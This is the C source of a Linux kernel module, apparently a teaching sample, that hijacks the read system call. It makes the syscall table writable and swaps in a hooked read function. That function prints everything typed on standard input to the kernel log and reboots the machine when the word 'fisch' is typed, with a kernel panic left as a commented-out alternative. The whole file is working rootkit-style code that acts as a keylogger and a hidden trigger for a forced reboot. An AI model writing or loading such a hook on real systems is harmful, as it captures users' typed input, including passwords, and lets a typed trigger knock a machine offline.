#include <linux/moduleloader.h>
#include <linux/unistd.h>
#include <linux/reboot.h>
#include "sysmap.h"		// for sys_call_table address this is Device spesific

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module hijacking the read"

int z = 0;

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap

asmlinkage int (*original_read) (unsigned int, char __user *, size_t);

asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
{
	int i;

	if( fd == 0 )		// reading from stdIn
	{
		i = original_read(fd, buf, count);
		switch(z) {		// search for input pattern
			case 0:
				if(buf[0] == 'f') {
					z=1;
				}
				else z=0;
				break;
			case 1:
				if(buf[0] == 'i'){
					z=2;
				}
				else z=0;
				break;
			case 2:
				if(buf[0] == 's'){
					z=3;
				}
				else z=0;
				break;
			case 3:
				if(buf[0] == 'c'){
					z=4;
				}
				else z=0;
				break;
			case 4:
				if(buf[0] == 'h'){
					//printk("found!\n");					// Found our magic pattern "fisch" from stdin
					kernel_restart(NULL);					// Restart the system
					// panic("Forced Panic! Go Crazy!");	// Make the kernel panic and crash the system :D
				}
				else z=0;
				break;

		}
		if(z==0) {
			printk("Message: %.*s\n", (int)count, buf);		// Print intersected data
		}
		return i;
	}
	else {		// read from anything but StdIn
		i = original_read(fd, buf, count);
		return i;
	}
}

/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

static int __init init_mod(void)
{
	printk("Insert Hock\n");
	make_rw((unsigned long)sys_call_table);
	original_read = (void*)*(sys_call_table + __NR_read);
	*(sys_call_table + __NR_read) = (unsigned long)hacked_read;
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running\n");
	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting hook\n");
	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_read) = (unsigned long)original_read;
	make_ro((unsigned long)sys_call_table);
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
